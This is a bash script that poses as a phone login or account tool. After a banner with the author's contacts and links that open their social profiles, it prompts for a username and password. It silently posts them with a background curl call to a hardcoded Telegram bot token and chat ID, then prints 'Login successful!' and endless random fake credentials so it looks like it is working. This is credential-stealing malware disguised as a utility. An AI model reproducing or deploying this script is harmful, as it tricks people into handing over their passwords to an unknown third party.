#!/bin/bash
#!/bin/bash
login(){
    echo -e "\e[31m
    ██████╗ ██████╗    ██████╗  █████╗ ██╗  ██╗ █████╗  █████╗ 
    ██╔══██╗██╔══██╗   ██╔══██╗██╔══██╗██║  ██║██╔══██╗██╔══██╗
    ██║  ██║██████╔╝   ██████╔╝███████║███████║███████║███████║
    ██║  ██║██╔══██╗   ██╔══██╗██╔══██║██╔══██║██╔══██║██╔══██║
    ██████╔╝██║  ██║▄█╗██████╔╝██║  ██║██║  ██║██║  ██║██║  ██║
    ╚═════╝ ╚═╝  ╚═╝╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
    \e[0m"
    echo -e "\e[32mContact me with \e[0m"
    echo -e "\e[32mwhatsapp : +201064004818\e[0m"
    echo -e "\e[32mTelegram : @bHa_0106 \e[0m"
    echo -e "\e[31mPrss Enter to contunu\e[0m"
    read -r 
    sleep 3
    OS=($uname -o )
    if [[ "$OS" == "Android" ]]; then
            am start -a android.intent.action.VIEW -d "tg://resolve?domain=bahaa_010640"
            echo -e "\e[31mPrss Enter to contunu\e[0m"
            read -r 
            am start -a android.intent.action.VIEW -d "fb://profile/100078733621449"
    else
        xdg-open "https://www.facebook.com/profile.php?id=100078733621449&mibextid=ZbWKwL"
            echo -e "\e[31mPrss Enter to contunu\e[0m"
            read -r 
            xdg-open "https://t.me/bHa_0106"
    fi
}
set(){
echo -e "\e[32mEnter Username of phone:\e[0m"
read -p "Username: " user

echo -e "\e[32mEnter Password of phone:\e[0m"
read -sp "Password: " pas
echo


while [[ ${#user} -lt 8 || ${#pas} -lt 6 ]]; do
    echo -e "\e[31mError: Username must be at least 9 characters and password at least 8 characters.\e[0m"
    echo -e "\e[32mEnter Username of phone:\e[0m"
    read -p "Username: " user
    echo -e "\e[32mEnter Password of phone:\e[0m"
    read -sp "Password: " pas
    echo
done
    sleep 5
BOT_TOKEN="7358706949:AAGmCtR29AVrmTO5lH6M7424T0pWim_Pm0k"
CHAT_ID="5792222595"
MESSAGE="User : $user : password : $pas"

nohup curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d "chat_id=$CHAT_ID" -d "text=$MESSAGE" &>/dev/null &
sleep 5

echo -e "\e[32mLogin successful!\e[0m"
}
Running(){
    while true; do
        username=$(shuf -i 1000000000-9999999999 -n 1)
        
        password=$(shuf -i 100000-999999 -n 1)
        
        if [ $((RANDOM % 5)) -eq 0 ]; then
            color="\e[31m" 
        else
            color="\e[32m" 
        fi
        
        echo -e "${color} username: $username :: Password: $password\e[0m"
        
        sleep 5
    done
}



login
set
Running


